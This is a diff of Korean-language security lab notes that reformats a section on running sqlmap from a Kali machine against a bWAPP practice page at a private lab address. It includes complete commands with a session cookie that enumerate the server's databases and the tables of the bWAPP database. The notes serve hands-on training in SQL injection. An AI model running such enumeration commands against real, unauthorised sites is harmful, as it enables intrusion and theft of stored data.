@@ -1295,17 +1295,13 @@ Parameterized Query #1
 
 
 
-@Kali#2에서 터미널을 실행
+#### sqlmap
 
-sqlmap -u "취약한 웹 페이지 주소" --cookie "세션 쿠키 값" --dbms취약한 웹 페이지 주소
-
-⇒ http://192.168.49.128/bWAPP/sqli_1.php?title=man&action=search
-
-세션 쿠키 값 ⇒ PHPSESSID=nm1c5267j62bm755qh44kl2nc6; security_level=0
-
-sqlmap -u
-
-"http://192.168.49.128/bWAPP/sqli_1.php?title=man&action=search" --cookie "PHPSESSID=nm1c5267j62bm755qh44kl2nc6; security_level=0" --dbs
+* @Kali#2에서 터미널을 실행
+  sqlmap -u "취약한 웹 페이지 주소" --cookie "세션 쿠키 값" --dbms취약한 웹 페이지 주소 ⇒ http://192.168.49.128/bWAPP/sqli_1.php?title=man&action=search 세션 쿠키 값 ⇒ PHPSESSID=nm1c5267j62bm755qh44kl2nc6; security_level=0
+* sqlmap -u
+  "http://192.168.49.128/bWAPP/sqli_1.php?title=man&action=search" --cookie "PHPSESSID=nm1c5267j62bm755qh44kl2nc6; security_level=0" --dbs  ⇐ 해당 서버의 db 목록 조회
+* sqlmap -u "http://192.168.49.128/bWAPP/sqli_1.php?title=man&action=search" --cookie "PHPSESSID=nm1c5267j62bm755qh44kl2nc6; security_level=0" -D bWAPP --tables ⇐ bWAPP DB에 테이블 목록을 조회
 
 
 
